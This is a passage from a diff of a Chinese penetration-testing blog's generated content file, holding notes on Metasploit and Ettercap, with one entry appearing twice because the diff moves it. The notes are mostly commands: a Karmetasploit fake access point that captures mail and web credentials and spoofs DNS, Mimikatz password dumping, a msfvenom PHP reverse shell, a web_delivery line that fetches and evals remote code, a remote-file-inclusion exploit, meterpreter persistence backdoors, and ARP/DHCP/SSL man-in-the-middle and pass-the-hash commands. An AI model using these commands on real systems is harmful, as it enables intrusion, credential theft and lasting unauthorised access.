class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn</span><br><span class="line"></span><br><span class="line">set LHOST 10.0.0.1</span><br><span class="line">set SRVPORT 55550</span><br><span class="line">set URIPATH &#x2F;ads</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn2</span><br><span class="line">set SRVPORT 55560</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 110</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 995</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;ftp</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 143</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 993</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 25</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 465</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">set TARGETACTION FAKE</span><br><span class="line">set TARGETDOMAIN www.taobao.com</span><br><span class="line">set TARGETHOST192.168.190.176</span><br><span class="line">set SRVPORT 53</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p><strong>再次启动Karmetasploit</strong></p><pre><code>msfconsole -q -r karma.rc_.txt </code></pre><p><strong>添加路由和防火墙规则</strong></p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -P FORWARD ACCEPTiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code></pre><ul><li>到此,使用Karmetasploit且让伪造AP能使用户上网的配置完成</li><li>当别人连接到伪造AP,就可以截获流量,并自动执行资源文件中的攻击动作,如果存在漏洞将自动获取shell</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> meterpreter </tag>
+            
+            <tag> 伪造AP </tag>
+            
+            <tag> airbase-ng </tag>
+            
+            <tag> 无线攻击 </tag>
+            
+            <tag> Karmetasploit </tag>
+            
+            <tag> dhcp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF后渗透测试阶段各种延伸用法</title>
+      <link href="/2016/03/17/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E5%90%84%E7%A7%8D%E5%BB%B6%E4%BC%B8%E7%94%A8%E6%B3%95/"/>
+      <url>/2016/03/17/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E5%90%84%E7%A7%8D%E5%BB%B6%E4%BC%B8%E7%94%A8%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<h4 id="MsF延伸用法之Mimikatz"><a href="#MsF延伸用法之Mimikatz" class="headerlink" title="MsF延伸用法之Mimikatz"></a><strong>MsF延伸用法之Mimikatz</strong></h4><p><strong>hashdump 使用的就是mimikatz的部分功能</strong></p><pre><code>#meterpreterhashdumpgetsystem        #使用mimikatz需要先获取system权限load mimikatz    #加载mimikatzwdigest            #查看内存存储的明文密码信息kerberos        #查看内存存储的明文密码信息msv                #获取系统用户密码hash身份认证信息ssp                #获取明文的身份认证信息livessp            #获取明文的身份认证信息tspkg            #也是查看身份认证信息的命令#重点命令mimikatz_command -hmimikatz_command -f a::                    #加一个错误的模块名,可以当帮助使用mimikatz_command -f samdump::hashes            #获取samdump数据库的信息mimikatz_command -f handle::list            #查看系统进程mimikatz_command -f service::list            #查看系统服务mimikatz_command -f crypto::listProviders    #加密套件mimikatz_command -f winmine::infos            #扫雷作弊工具,纯属好玩的模块</code></pre><h4 id="PHP-shell"><a href="#PHP-shell" class="headerlink" title="PHP shell"></a><strong>PHP shell</strong></h4><pre><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></pre><ul><li>MSF 启动侦听<ul><li>上传到web站点并通过浏览器访问,执行反弹shell</li></ul></li></ul><h4 id="Web-Delivery"><a href="#Web-Delivery" class="headerlink" title="Web Delivery"></a><strong>Web Delivery</strong></h4><ul><li>利用远程代码执行漏洞访问攻击者服务器  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">set target 1</span><br><span class="line">set URIPATH &#x2F;</span><br><span class="line">set lhost 192.168.190.178</span><br><span class="line">;php -d allow_url_fopen&#x3D;true -r “eval(file_get_contents(‘http:&#x2F;&#x2F;1.1.1.1&#x2F;fTYWqmu&#39;));&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI 远程文件包含"></a><strong>RFI 远程文件包含</strong></h4><pre><code>vi /etc/php5/cgi/php.ini        #php info 配置文件    allow_url_fopen = On    allow_url_include = On</code></pre><ul><li>使用php_include远程文件包含漏洞MSF模块  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;php_include</span><br><span class="line">set RHOST 1.1.1.2</span><br><span class="line">set PATH &#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;</span><br><span class="line">set PHPURI &#x2F;?page&#x3D;XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security&#x3D;low;PHPSESSID&#x3D;eefcf023ba61219d4745ad7487fe81d7&quot;</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 1.1.1.1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> mimikatz </tag>
+            
+            <tag> meterpreter </tag>
+            
+            <tag> 后门持久化 </tag>
+            
+            <tag> hashdump </tag>
+            
+            <tag> 远程文件包含 </tag>
+            
+            <tag> 远程代码执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF后渗透测试阶段之后门持久化</title>
+      <link href="/2016/03/16/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
+      <url>/2016/03/16/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/</url>
+      
+        <content type="html"><![CDATA[<h4 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a><strong>持久后门</strong></h4><ul><li>利用漏洞取得的meterpreter shell 运行于内存中,重启失效</li><li>重复 exploit 漏洞可能造成服务崩溃</li><li>持久后门保证漏洞修复后仍可远程控制</li></ul><ol><li><p><strong>Meterpreter脚本实现的正向持久后门</strong> - 缺点是别人发现了该端口都可以连</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A#删除 -r,安装并启动metsvc服务,默认31337端口</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;metsvc_bind_tcp#使用metsvc payload模块连接</span><br><span class="line">set LPORT 31337</span><br><span class="line">set RHOST 1.1.1.1</span><br></pre></td></tr></table></figure></li><li><p><strong>Meterpreter脚本实现的反弹持久后门</strong></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run persistence -h</span><br><span class="line">run persistence -X -i 10 -p 4444 -r 1.1.1.1#写入脚本和注册表启动项启动</span><br><span class="line">background</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 1.1.1.1</span><br><span class="line">set lport 4444</span><br><span class="line">set exitonsession false#持续侦听端口配置参数</span><br><span class="line">exploit -j -z</span><br><span class="line"></span><br><span class="line">#其它两个参数</span><br><span class="line">run persistence -U -i 20 -p 4444 -r 1.1.1.1</span><br><span class="line">run persistence -S -i 20 -p 4444 -r 1.1.1.1#-S 服务启动</span><br></pre></td></tr></table></figure></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> meterpreter </tag>
+            
+            <tag> metsvc </tag>
+            
+            <tag> persistence </tag>
+            
+            <tag> 后门持久化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MsF后渗透测试阶段之meterpreter脚本及post模块</title>
       <link href="/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/"/>
       <url>/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/</url>
@@ -543,9 +839,9 @@
             
             <tag> 提权 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 后门持久化 </tag>
+            
+            <tag> 内网渗透 </tag>
             
         </tags>
       
@@ -831,9 +1127,9 @@
             
             <tag> payload </tag>
             
-            <tag> shellcode </tag>
-            
             <tag> exploit </tag>
+            
+            <tag> shellcode </tag>
             
         </tags>
       
@@ -1134,9 +1430,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> SSH </tag>
-            
             <tag> VNC </tag>
+            
+            <tag> SSH </tag>
             
             <tag> proxychains </tag>
             
@@ -1169,9 +1465,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> shell </tag>
-            
             <tag> SSH </tag>
+            
+            <tag> shell </tag>
             
             <tag> 隧道 </tag>
             
@@ -1248,6 +1544,43 @@
     
     
     <entry>
+      <title>Ettercap中间人攻击</title>
+      <link href="/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+      <url>/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a><strong>Ettercap</strong></h3></blockquote><ul><li>统一的中间人攻击工具</li><li>转发MAC与本机相同，但IP与本机不同的数据包</li><li>支持SSH1、SSL中间人攻击<h4 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a><strong>模块划分</strong></h4></li><li>Snifer</li><li>MITM</li><li>Filter</li><li>Log </li><li>Plugin</li></ul><h5 id="Snifer"><a href="#Snifer" class="headerlink" title="Snifer"></a><strong>Snifer</strong></h5><p>负责数据包转发<br><strong>Unified</strong></p><ul><li>单网卡情况下独立完成三层包转发</li><li>始终禁用内核IP_Forward功能</li><li><em>Bridge*</em></li><li>双网卡情况下的一层MITM模式</li><li>可作为IPS过滤数据包</li><li>不可在网关上使用(透明网桥)<h5 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a><strong>MITM</strong></h5></li><li>把流量重定向到ettercap主机上</li><li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li><li><em>实现MITM的方法*</em></li><li>ARP</li><li>ICMP<br>  ICMP路由重定向，半双工</li><li>DHCP<br>  修改网关地址,半双工<br>  Switch Port Stealing    #交换机端口窃取<br>  flood目标地址是本机，源地址是受害者的包<br>  适用于ARP静态绑定的环境</li><li>NDP<br>  IPv6协议欺骗技术</li></ul><p><strong>2.4以上内核对ARP地址欺骗的约束</strong></p><ul><li>收到非请求的ARP响应包，不更新本地ARP缓存</li><li>Ettercap使用ARP request包进行攻击</li><li><em>Solaris 不根据ARP包更新本地ARP缓存*</em></li><li>Ettercap使用先发ICMP包来更新ARP缓存</li></ul><p><strong>用户操作界面</strong><br>    -T 字符模式界面<br>    -G 图形界面<br>    -C 基于字符的图形界面<br>    -D 后台模式</p><p><strong>指定目标</strong></p><pre><code>IPv4：MAC/IPs/PortsIPv6：MAC/IPs/IPv6/Ports/10.0.0.1-5;10.0.1.33/20-25,80,110</code></pre><p><strong>权限</strong></p><ul><li>需要root权限打开链路层Socket连接,然后使用nobody账号运行</li><li>日志写入目录需要nobody有写入权</li><li>修改etter.conf：EC_UID=65534        #改为0</li></ul><p><strong>基于伪造证书的SSL MITIM</strong></p><pre><code>Bridge模式不支持SSL MITM 需要生成SSL证书openssl genrsa -out etter.ssl.crt 1024openssl req -new-keyetter.ssl.crt -out tmp.csropenssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.newcat tmp.new&gt;&gt;etter.ssl.crtrm −f tmp.newtmp.csr</code></pre><h3 id="ARP-MITM"><a href="#ARP-MITM" class="headerlink" title="ARP MITM"></a><strong>ARP MITM</strong></h3><p><strong>字符模式</strong></p><pre><code>ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></pre><p><strong>图形界面</strong></p><h5 id="SSL-MITM"><a href="#SSL-MITM" class="headerlink" title="SSL MITM"></a><strong>SSL MITM</strong></h5><p><code>vi /etc/ettercap/etter.conf</code></p><h5 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a><strong>DNS欺骗</strong></h5><p>dns_spoof插件配置文件<br>    <code>vi /etc/ettercap/etter.dns</code></p><h4 id="Ettercap-日志查看"><a href="#Ettercap-日志查看" class="headerlink" title="Ettercap 日志查看"></a><strong>Ettercap 日志查看</strong></h4><pre><code>etterlog -p log.eci     #查看获取的密码etterlog -c log.ecp     #列出Log中的连接etterlog -c -f /1.1.1.1/ log.ecpetterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa     #选择相应的连接并榨取文件</code></pre><h4 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter    过滤器"></a><strong>Filter</strong>    过滤器</h4><pre><code>ls /usr/share/ettercap/SSH-2.xx / SSH-1.99 / SSH-1.51etterfilter etter.filter.ssh -o ssh.ef        #编译可执行二进制文件,-F 作SSH嗅探</code></pre><h5 id="替换HTTP内容"><a href="#替换HTTP内容" class="headerlink" title="替换HTTP内容"></a>替换HTTP内容</h5><ul><li>替换图片</li><li>替换exe后门程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; tcp.src &#x3D;&#x3D; 80) &#123;</span><br><span class="line">msg(&quot;data on TCP 80\n&quot;);</span><br><span class="line">replace(&quot;img src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG SRC&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="ICMP-中间人攻击"><a href="#ICMP-中间人攻击" class="headerlink" title="ICMP 中间人攻击"></a><strong>ICMP 中间人攻击</strong></h4><pre><code>-M icmp:00:11:22:33:44:55/10.0.0.1        #真实网关的MAC/IP</code></pre><h4 id="DHCP-中间人攻击"><a href="#DHCP-中间人攻击" class="headerlink" title="DHCP 中间人攻击"></a><strong>DHCP 中间人攻击</strong></h4><pre><code>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1        #DNS </code></pre><h4 id="Port-基于交换机端口窃取的中间人攻击"><a href="#Port-基于交换机端口窃取的中间人攻击" class="headerlink" title="Port 基于交换机端口窃取的中间人攻击"></a><strong>Port 基于交换机端口窃取的中间人攻击</strong></h4><pre><code>-M port /1.1.1.1/ /1.1.1.2/</code></pre><h4 id="Ndp-IPv6协议欺骗中间人攻击"><a href="#Ndp-IPv6协议欺骗中间人攻击" class="headerlink" title="Ndp IPv6协议欺骗中间人攻击"></a><strong>Ndp</strong> IPv6协议欺骗中间人攻击</h4><pre><code>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</code></pre><h3 id="Pass-the-Hash-PTH"><a href="#Pass-the-Hash-PTH" class="headerlink" title="Pass the Hash (PTH)"></a><strong>Pass the Hash</strong> (PTH)</h3><ul><li>密码破解耗费时间资源巨大</li><li>使用密文提交给服务器直接完成身份认证</li><li>NTLM/LM是没有加盐的静态HASH密文</li><li>企业中使用ghost等工具克隆安装系统</li></ul><h4 id="利用sam-hash密文远程登录windows"><a href="#利用sam-hash密文远程登录windows" class="headerlink" title="利用sam hash密文远程登录windows"></a><strong>利用sam hash密文远程登录windows</strong></h4><pre><code>pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8 //1.1.1.1 cmd</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 密码攻击 </category>
+          
+          <category> 嗅探欺骗 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> arpspoof </tag>
+            
+            <tag> dnsspoof </tag>
+            
+            <tag> Ettercap </tag>
+            
+            <tag> PTH </tag>
+            
+            <tag> 中间人攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
       <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
       <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
@@ -1285,43 +1618,6 @@
     
     
     <entry>
-      <title>Ettercap中间人攻击</title>
-      <link href="/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-      <url>/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
-      
-        <content type="html"><![CDATA[<blockquote><h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a><strong>Ettercap</strong></h3></blockquote><ul><li>统一的中间人攻击工具</li><li>转发MAC与本机相同，但IP与本机不同的数据包</li><li>支持SSH1、SSL中间人攻击<h4 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a><strong>模块划分</strong></h4></li><li>Snifer</li><li>MITM</li><li>Filter</li><li>Log </li><li>Plugin</li></ul><h5 id="Snifer"><a href="#Snifer" class="headerlink" title="Snifer"></a><strong>Snifer</strong></h5><p>负责数据包转发<br><strong>Unified</strong></p><ul><li>单网卡情况下独立完成三层包转发</li><li>始终禁用内核IP_Forward功能</li><li><em>Bridge*</em></li><li>双网卡情况下的一层MITM模式</li><li>可作为IPS过滤数据包</li><li>不可在网关上使用(透明网桥)<h5 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a><strong>MITM</strong></h5></li><li>把流量重定向到ettercap主机上</li><li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li><li><em>实现MITM的方法*</em></li><li>ARP</li><li>ICMP<br>  ICMP路由重定向，半双工</li><li>DHCP<br>  修改网关地址,半双工<br>  Switch Port Stealing    #交换机端口窃取<br>  flood目标地址是本机，源地址是受害者的包<br>  适用于ARP静态绑定的环境</li><li>NDP<br>  IPv6协议欺骗技术</li></ul><p><strong>2.4以上内核对ARP地址欺骗的约束</strong></p><ul><li>收到非请求的ARP响应包，不更新本地ARP缓存</li><li>Ettercap使用ARP request包进行攻击</li><li><em>Solaris 不根据ARP包更新本地ARP缓存*</em></li><li>Ettercap使用先发ICMP包来更新ARP缓存</li></ul><p><strong>用户操作界面</strong><br>    -T 字符模式界面<br>    -G 图形界面<br>    -C 基于字符的图形界面<br>    -D 后台模式</p><p><strong>指定目标</strong></p><pre><code>IPv4：MAC/IPs/PortsIPv6：MAC/IPs/IPv6/Ports/10.0.0.1-5;10.0.1.33/20-25,80,110</code></pre><p><strong>权限</strong></p><ul><li>需要root权限打开链路层Socket连接,然后使用nobody账号运行</li><li>日志写入目录需要nobody有写入权</li><li>修改etter.conf：EC_UID=65534        #改为0</li></ul><p><strong>基于伪造证书的SSL MITIM</strong></p><pre><code>Bridge模式不支持SSL MITM 需要生成SSL证书openssl genrsa -out etter.ssl.crt 1024openssl req -new-keyetter.ssl.crt -out tmp.csropenssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.newcat tmp.new&gt;&gt;etter.ssl.crtrm −f tmp.newtmp.csr</code></pre><h3 id="ARP-MITM"><a href="#ARP-MITM" class="headerlink" title="ARP MITM"></a><strong>ARP MITM</strong></h3><p><strong>字符模式</strong></p><pre><code>ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></pre><p><strong>图形界面</strong></p><h5 id="SSL-MITM"><a href="#SSL-MITM" class="headerlink" title="SSL MITM"></a><strong>SSL MITM</strong></h5><p><code>vi /etc/ettercap/etter.conf</code></p><h5 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a><strong>DNS欺骗</strong></h5><p>dns_spoof插件配置文件<br>    <code>vi /etc/ettercap/etter.dns</code></p><h4 id="Ettercap-日志查看"><a href="#Ettercap-日志查看" class="headerlink" title="Ettercap 日志查看"></a><strong>Ettercap 日志查看</strong></h4><pre><code>etterlog -p log.eci     #查看获取的密码etterlog -c log.ecp     #列出Log中的连接etterlog -c -f /1.1.1.1/ log.ecpetterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa     #选择相应的连接并榨取文件</code></pre><h4 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter    过滤器"></a><strong>Filter</strong>    过滤器</h4><pre><code>ls /usr/share/ettercap/SSH-2.xx / SSH-1.99 / SSH-1.51etterfilter etter.filter.ssh -o ssh.ef        #编译可执行二进制文件,-F 作SSH嗅探</code></pre><h5 id="替换HTTP内容"><a href="#替换HTTP内容" class="headerlink" title="替换HTTP内容"></a>替换HTTP内容</h5><ul><li>替换图片</li><li>替换exe后门程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; tcp.src &#x3D;&#x3D; 80) &#123;</span><br><span class="line">msg(&quot;data on TCP 80\n&quot;);</span><br><span class="line">replace(&quot;img src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG SRC&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="ICMP-中间人攻击"><a href="#ICMP-中间人攻击" class="headerlink" title="ICMP 中间人攻击"></a><strong>ICMP 中间人攻击</strong></h4><pre><code>-M icmp:00:11:22:33:44:55/10.0.0.1        #真实网关的MAC/IP</code></pre><h4 id="DHCP-中间人攻击"><a href="#DHCP-中间人攻击" class="headerlink" title="DHCP 中间人攻击"></a><strong>DHCP 中间人攻击</strong></h4><pre><code>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1        #DNS </code></pre><h4 id="Port-基于交换机端口窃取的中间人攻击"><a href="#Port-基于交换机端口窃取的中间人攻击" class="headerlink" title="Port 基于交换机端口窃取的中间人攻击"></a><strong>Port 基于交换机端口窃取的中间人攻击</strong></h4><pre><code>-M port /1.1.1.1/ /1.1.1.2/</code></pre><h4 id="Ndp-IPv6协议欺骗中间人攻击"><a href="#Ndp-IPv6协议欺骗中间人攻击" class="headerlink" title="Ndp IPv6协议欺骗中间人攻击"></a><strong>Ndp</strong> IPv6协议欺骗中间人攻击</h4><pre><code>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</code></pre><h3 id="Pass-the-Hash-PTH"><a href="#Pass-the-Hash-PTH" class="headerlink" title="Pass the Hash (PTH)"></a><strong>Pass the Hash</strong> (PTH)</h3><ul><li>密码破解耗费时间资源巨大</li><li>使用密文提交给服务器直接完成身份认证</li><li>NTLM/LM是没有加盐的静态HASH密文</li><li>企业中使用ghost等工具克隆安装系统</li></ul><h4 id="利用sam-hash密文远程登录windows"><a href="#利用sam-hash密文远程登录windows" class="headerlink" title="利用sam 